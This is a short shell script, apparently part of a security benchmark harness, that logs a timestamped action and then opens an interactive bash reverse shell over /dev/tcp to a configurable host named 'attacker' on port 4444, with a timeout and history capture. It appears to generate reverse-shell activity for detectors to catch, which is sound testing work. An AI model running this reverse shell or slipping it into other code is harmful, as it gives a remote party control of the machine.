#!/bin/sh
set -u
marker="${BENCH_MARKER:-manual}"
attacker="${BENCH_ATTACKER:-attacker}"
work="/tmp/bench-$marker"

sh "$(dirname "$0")/cleanup.sh"
mkdir -p "$work" || exit 1

echo "BENCH_ACTION $(date +%s.%N)"
HISTFILE="$work/revshell.history" PROMPT_COMMAND='history -a' timeout 20 bash -c 'bash -i >& "/dev/tcp/$1/4444" 0>&1' "bench-revshell-$marker" "$attacker"
status=$?
echo "reverse shell session to $attacker:4444 ended with status $status"
exit "$status"
